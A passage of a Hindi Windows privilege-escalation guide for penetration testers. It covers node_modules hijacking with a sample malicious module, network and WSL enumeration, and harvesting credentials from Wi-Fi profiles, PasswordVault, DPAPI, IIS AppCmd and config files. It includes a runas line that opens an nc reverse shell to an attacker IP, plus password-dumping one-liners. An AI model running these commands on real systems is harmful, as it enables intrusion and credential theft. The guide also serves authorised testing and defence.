अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) रख सकता है और **higher-privileged Node/Electron process** द्वारा missing dependency resolve किए जाने की प्रतीक्षा कर सकता है। Payload, victim process के security context में execute होता है। इसलिए, जब भी target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app से चलता है, यह **LPE** बन जाता है।

यह खास तौर पर आम है, जब:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
- कोई third-party library, `require("foo")` को `try/catch` में wrap करे और विफल होने पर भी आगे जारी रहे
- production builds से कोई package हटा दिया गया हो, packaging के दौरान छूट गया हो, या install न हो पाया हो
- vulnerable `require()` मुख्य application code के बजाय dependency tree के भीतर गहराई में हो

### Vulnerable targets की खोज

Resolution path की पुष्टि करने के लिए **Procmon** का उपयोग करें:<sup>[[23]](#references)</sup>

- `Process Name` = target executable (`node.exe`, Electron app EXE, या wrapper process) से filter करें
- `Path` में `node_modules` `contains` होने पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत सफलतापूर्वक खुले अंतिम path पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **missing package name** पहचानें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. सटीक अपेक्षित नाम वाला module drop करें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application को ट्रिगर करें। अगर application `require("foo")` का प्रयास करती है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस pattern में फिट होने वाले missing optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** का दोबारा इस्तेमाल किया जा सकता है: किसी भी **missing bare import** को खोजें जिसे privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के सुझाव

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाली high-integrity processes की जाँच करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` के इस्तेमाल का audit करें।
- Silent `try { require("...") } catch {}` patterns के लिए third-party code की समीक्षा करें।
- जब library इसका समर्थन करती हो, तो optional probes बंद करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## Network

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcode किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें.

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

स्थानीय listener के लिए, उसके PID का मिलान process owner, executable path और उसे शुरू करने वाली किसी service या scheduled task से करें। Remote-control service केवल तभी अपने desktop user के रूप में access दे सकती है, जब उसका authentication और command controls इसकी अनुमति दें। उच्च-विशेषाधिकार वाले account के रूप में चल रहा custom TCP application अलग से समीक्षा का लक्ष्य है: listener और binary path केवल शुरुआती संकेत हैं, जबकि authenticated memory-corruption route की पुष्टि के लिए उसी binary और उस तक पहुँचने वाले input का विश्लेषण आवश्यक है। अगर कोई exposed port किसी system process का लगता है, तो backend service का स्रोत तय करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule होने से यह साबित नहीं होता कि destination तक पहुँचा जा सकता है या वह vulnerable है।

### Routing Table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP तालिका

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित कमांड के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची बनाएं, नियम बनाएं, बंद करें, बंद करें...)**

[नेटवर्क एन्यूमरेशन के लिए और कमांड यहां](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी मिल सकता है।

अगर आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार `nc.exe` का इस्तेमाल करके किसी port पर listen करने पर, GUI के ज़रिए पूछा जाएगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Root के रूप में bash आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में `WSL` फ़ाइलसिस्टम देख सकते हैं।

WSL के अंदर Linux `root` होने से अपने आप Windows Administrator अधिकार नहीं मिलते। यदि मौजूदा Windows पहचान किसी distribution के फ़ाइलसिस्टम को पढ़ सकती है, तो shell-history फ़ाइलों (जिसमें `/root/.bash_history` भी शामिल है) में ऐसे commands देखें जिनमें credentials दर्ज हुए हों; privilege escalation के लिए अब भी उच्च-privilege वाले मान्य account और अनुमत authentication path की आवश्यकता होती है। `LocalState\rootfs` लेआउट पुराने WSL installations पर लागू होता है; WSL 2 में distribution आम तौर पर [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में संग्रहित होता है, इसलिए पहले वास्तविक distribution और storage path की पहचान करें। Automated enumeration के दौरान history की सामग्री print करने से बचें।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को account context मानें, credentials नहीं। गैर-खाली `DefaultPassword` या `AltDefaultPassword` मान plaintext registry finding है। अगर `AutoAdminLogon=1` है, लेकिन plaintext password पढ़ा नहीं जा सकता, तो यह केवल एक संकेत है: [Sysinternals Autologon पासवर्ड को LSA secret के रूप में स्टोर कर सकता है](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह साबित नहीं होता कि वह secret मौजूद है या उसे प्राप्त किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की जाँच करें।

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> से\
Windows Vault, servers, websites और अन्य programs के लिए user credentials स्टोर करता है, जिनका इस्तेमाल **Windows** **users को अपने-आप log in करने** के लिए कर सकता है। पहले यह लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials स्टोर कर सकते हैं और browsers अपने-आप log in कर सकते हैं, लेकिन यह ऐसे काम नहीं करता।

Windows Vault ऐसे credentials स्टोर करता है जिनका इस्तेमाल Windows users को अपने-आप log in करने के लिए कर सकता है। इसका मतलब है कि कोई भी **Windows application जिसे किसी resource** (server या website) **तक पहुँचने के लिए credentials की ज़रूरत हो**, इस Credential Manager और Windows Vault का इस्तेमाल कर सकता है और users के हर बार username और password डालने के बजाय दिए गए credentials का उपयोग कर सकता है।

जब तक applications, Credential Manager के साथ इंटरैक्ट न करें, मुझे नहीं लगता कि वे किसी दिए गए resource के credentials का इस्तेमाल कर सकते हैं। इसलिए, अगर आपका application vault का इस्तेमाल करना चाहता है, तो उसे किसी तरह **credential manager से संचार करके उस resource के credentials का अनुरोध** default storage vault से करना चाहिए।

मशीन पर स्टोर किए गए credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

फिर आप सहेजे गए credentials का उपयोग करने के लिए `/savecred` विकल्प के साथ `runas` का उपयोग कर सकते हैं। निम्न उदाहरण SMB share के ज़रिए किसी remote binary को कॉल करता है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

दिए गए क्रेडेंशियल्स के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services, authentication tokens और plaintext passwords को Universal Windows Platform (UWP) `PasswordVault` के अंदर संग्रहीत करते हैं (जिसे `vaultcmd` में `Web Credentials` के रूप में भी दिखाया जाता है)। यह storage space session-isolated होता है और इसे administrative या `SeDebugPrivilege` अधिकारों के बिना native रूप से decrypt किया जा सकता है।

सभी संग्रहीत usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, उपयोगकर्ता के active session के अंदर यह PowerShell command चलाएँ:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा को symmetric encryption से एन्क्रिप्ट करने का तरीका प्रदान करता है। इसका उपयोग मुख्यतः Windows operating system में asymmetric private keys को symmetric encryption से एन्क्रिप्ट करने के लिए किया जाता है। इस encryption में entropy को बढ़ाने में महत्वपूर्ण योगदान देने के लिए user या system secret का इस्तेमाल होता है।

**DPAPI, user के login secrets से निकली symmetric key के ज़रिए keys को encrypt करने की सुविधा देता है**। System encryption वाले मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI से एन्क्रिप्ट की गई user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में संग्रहित होती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, जो उसी file में user की private keys को सुरक्षित रखने वाली master key के साथ मौजूद होती है**, आमतौर पर 64 bytes का random data होती है। (ध्यान दें कि इस directory तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` command से इसकी सामग्री की सूची नहीं देखी जा सकती, हालाँकि PowerShell से देखी जा सकती है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए उचित arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password द्वारा सुरक्षित credentials files** आमतौर पर यहाँ स्थित होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप decrypt करने के लिए उचित `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग कर सकते हैं।\
अगर आप root हैं, तो `sekurlsa::dpapi` module से **memory** से कई DPAPI **masterkeys** **extract** कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks में encrypted credentials को सुविधाजनक तरीके से store करने के लिए किया जाता है। ये credentials **DPAPI** का उपयोग करके सुरक्षित किए जाते हैं, जिसका आम तौर पर अर्थ है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypt किया जा सकता है जिस पर इन्हें बनाया गया था।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory इसकी ओर संकेत करे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory खोजें: [Windows profiles को दूसरी जगह रख सकता है](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। किसी file का पढ़ा जा सकना केवल एक सुराग है; [Windows `Export-Clixml` encrypted credential को export करने वाले user और computer से bind करता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और मिले हुए किसी भी account के पास लक्षित service पर अलग से valid rights होने चाहिए। नियमित enumeration के दौरान encrypted या plaintext values दिखाए बिना, पहले paths और ACLs की जाँच करें।

किसी file में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड्स

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** के `dpapi::rdg` module का उपयोग उपयुक्त `/masterkey` के साथ **किसी भी .rdg फ़ाइल को decrypt करने** के लिए करें।\
आप Mimikatz के `sekurlsa::dpapi` module से memory से **कई DPAPI masterkeys निकाल** सकते हैं।

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और उपयोगकर्ता के Documents में पढ़े जा सकने वाले XML की जाँच करें, जिसमें `config.xml` जैसी सामान्य नाम वाली फ़ाइलें भी शामिल हैं। XML फ़ाइल को credential lead मानने से पहले connection schema और encrypted `Password` attributes की पहचान करें। संग्रहीत value कोई DPAPI/RDCMan password नहीं है; इसे recover करना फ़ाइल की encryption settings और इस बात पर निर्भर करता है कि custom master password का उपयोग किया गया था या नहीं। व्यापक enumeration के दौरान encrypted values को print न करें।

**Remote Desktop Plus profile exports** उपयोगकर्ता की directories या साझा administration folder में पढ़े जा सकने योग्य रूप में भी मिल सकते हैं। एक पुराने `profiles.xml` export में `ProfileName`, `Password`, और `Secure` elements वाली `Data/Profile` entries होती हैं। Nonempty password element को credential lead मानें, लेकिन उसे print न करें और न ही plaintext मानें: [vendor के नोट्स](https://www.donkz.nl/) के अनुसार, profile protection को बनाने वाले account और computer से बाँधा जा सकता है या इसे कम सख्ती से configure किया जा सकता है। इस पर निर्भर होने से पहले फ़ाइल का स्रोत और recovery की शर्तें पक्की करें।

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **passwords** और अन्य जानकारी **save करने** के लिए करते हैं, यह जाने बिना कि यह एक database file है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर होती है और इसे हमेशा खोजना और जाँचना चाहिए।

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी save करते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर store करता है; पुराने या अलग apps अन्य user-profile stores, जैसे LevelDB, का उपयोग कर सकते हैं। किसी SQLite फ़ाइल के न मिलने को notes न होने का प्रमाण मानने से पहले installed app और storage format की पहचान करें।

यदि Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में committed notes शामिल नहीं हो सकते। Database की एक सुसंगत copy के साथ संबंधित `plum.sqlite-wal` रखें, और उपलब्ध होने पर `plum.sqlite-shm` भी शामिल करें; shared-memory index को फिर से बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। Account name या password वाला note केवल एक credential lead है: account, अनुमत access और password reuse को अलग से verify करें। Encrypted password-manager record से higher-privilege login स्थापित करने से पहले उसकी वास्तविक decryption key और application-specific interpretation भी आवश्यक है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना और High Integrity level में चलाना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से लिया गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
Installers को **SYSTEM privileges के साथ चलाया जाता है**, और कई **DLL Sideloading के प्रति vulnerable होते हैं (जानकारी यहाँ से** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## फ़ाइलें और Registry (Credentials)

### Support-tool registry credential artifacts

कुछ पुराने remote-support installations, application की निश्चित registry keys के अंतर्गत password-संबंधी value names बनाए रखते हैं। उदाहरण के लिए, [vendor की registry-key व्याख्या](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer का `SecurityPasswordAES` version 9 से पहले configured static session password की पहचान करता था। Value-name marker केवल समीक्षा के लिए एक संकेत है: उस credential का आकलन करने से पहले installed version, पढ़े जा सकने वाले value data, format और मौजूदा authentication behavior की पुष्टि करें। Remote-support password से अधिक privileged Windows account तक पहुँचना तभी संभव है, जब password वास्तव में दोबारा इस्तेमाल हुआ हो और उस account के लिए authorization हो। नियमित enumeration output में ciphertext और recovered passwords न रखें।

### Protected sheets वाली shared spreadsheets

यदि संदेह हो कि किसी पढ़ी जा सकने वाली shared workbook में account data है, तो **file encryption** और worksheet protection या hidden columns में अंतर करें। [Microsoft के अनुसार](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), worksheet protection editing को नियंत्रित करता है और यह security feature नहीं है; इससे अपने-आप यह साबित नहीं होता कि workbook की सामग्री encrypted है। केवल authorized और प्रासंगिक files की समीक्षा करें, और व्यापक enumeration के दौरान संभावित secrets को print करने से बचें। केवल पढ़ा जा सकने वाला `.xlsx` path, protected sheet या hidden column यह साबित नहीं करता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights की अलग से पुष्टि करें।

### CI server में रखे गए change patches

Build पूरा होने के बाद भी CI server अपने data directory में सबमिट किए गए source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) में `system/changes` को remote-run changes के storage के रूप में बताया गया है; data directory को configure किया जा सकता है और वह आवश्यक नहीं कि `ProgramData` के अंतर्गत हो। पढ़ा जा सकने वाला patch, credential file, encryption key या ऐसी script के हटाए गए या जोड़े गए references सुरक्षित रख सकता है जो इन दोनों का उपयोग करती हो। उदाहरण के लिए, PowerShell `ConvertTo-SecureString -Key` workflow के लिए AES key और encrypted string दोनों चाहिए; [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) बताते हैं कि key अलग से दी जाती है। पहले केवल उपलब्ध patch names की समीक्षा करें, फिर authorization के तहत प्रासंगिक content देखें; नियमित enumeration output में secrets print न करें। केवल patch path, encrypted value या key reference किसी valid credential या higher-privilege access को साबित नहीं करता। Data-directory ACLs सीमित रखें और build changes में secrets commit न करें।

### Custom local administrator password rotation

घर में बनाया गया password rotator, encrypted local administrator password को local service में रख सकता है, जबकि उसके datastore credentials किसी पढ़ी जा सकने वाली `.env` file में या updater binary के पास रखे होते हैं। Updater के scheduled task, account, configuration ACLs, listener और datastore permissions की एक साथ समीक्षा करें। केवल loopback पर उपलब्ध datastore भी उस local user के लिए पहुँच योग्य है जिसके पास valid credentials हों, लेकिन केवल authentication से यह साबित नहीं होता कि उसे प्रासंगिक records पढ़ने की permission है। यदि encryption seed या key material ciphertext के पास उपलब्ध है, तो encryption पर भरोसा करने से पहले सटीक key derivation की समीक्षा करें। उजागर seed से Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके नियतात्मक रूप से AES key बनाने वाली scheme उस password की सुरक्षा के लिए अनुपयुक्त है; Go इस package को security-संवेदनशील randomness के लिए अनुपयुक्त बताता है। किसी recovered password को escalation path मानने से पहले पुष्टि करें कि वह मौजूदा है और local Administrators-group account का है। Scheduled task, `.env` path या encrypted blob अकेले इनमें से किसी भी शर्त को साबित नहीं करता। नियमित enumeration output में passwords और key material न रखें।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-आधारित storage और access controls, custom local datastore से अलग हैं; इसी तरह [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) तय करते हैं कि authenticated datastore user कोई विशिष्ट index पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। पढ़ा जा सकने वाला custom plugin, configuration या bytecode में embedded service credential रख सकता है। Archive की समीक्षा केवल authorization होने पर करें और recovered secrets को नियमित enumeration output से बाहर रखें। केवल plugin path यह साबित नहीं करता कि कोई secret मौजूद है, और recovered service password से higher privileges तभी मिलते हैं, जब वह किसी अधिक privileged account के लिए भी valid हो। संबंधित file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle के JAR दस्तावेज़](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account इसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property की एक साथ समीक्षा करें। Openfire के [user-provider दस्तावेज़](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में रखे जा सकते हैं या उस property में मौजूद key से encrypt किए जा सकते हैं। Recovered password escalation के लिए तभी मायने रखता है, जब वह अब भी किसी अधिक privileged identity के लिए valid हो; केवल file name से न तो read access साबित होता है, न credential reuse। यह path inventory का एक संकेत है, इसलिए database content और credentials को नियमित enumeration output से बाहर रखें।

अलग `Openfire\conf\openfire.xml` file, बाहरी database के उपयोग के बावजूद, admin console के configured ports और bind interface का पता बता सकती है। Openfire आमतौर पर अपने admin console को loopback पर bind करता है; यदि listener चल रहा हो, तो local account उस address तक फिर भी पहुँच सकता है। वास्तविक listener, authorized admin role, plugin-upload policy और Openfire service identity को एक साथ जाँचें। जो admin plugin install कर सकता है, वह plugin code को service के context में चला सकता है; यदि service LocalSystem के रूप में चलती है, तो यह context अत्यधिक privileged हो सकता है। किसी matching account password या पढ़े जा सकने वाले configuration path से अकेले admin-console access या code execution साबित नहीं होता। Vendor की [installation और plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिनका सामान्य नाम `server.config.yaml` होता है, internal CA का `CA.private_key` रख सकते हैं। यदि कम privileged user उस key को पढ़ सकता है, तो वह API client certificate बना सकता है। इससे higher privileges मिलेंगे या नहीं, यह server के user roles, API reachability और server या target agent जिस identity के अंतर्गत execute करता है, उन पर निर्भर करता है। Client configuration में अलग material होता है; उसे खोज लेने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए पढ़ी जा सकने वाली server configuration में signing key मौजूद न भी हो सकती है।

Windows server पर, installation directory में **server** configuration और उसकी किसी भी सुरक्षित backup copy के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; यदि service का configured path अलग हो, तो उसी का उपयोग करें। पुष्टि करें कि मौजूदा identity file पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Logs या enumeration output में private key print न करें। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन इसके लिए server-side प्रभावी role भी आवश्यक है; ऐसा role बनाना या बदलना datastore write access या restart की मांग कर सकता है। यदि वे writes उपलब्ध न हों, तो पहले से मौजूद privileged server identity एक रास्ता दे सकती है। Execution rights वाले API queries संबंधित server या agent context में चलते हैं, जो अत्यधिक privileged हो सकता है।

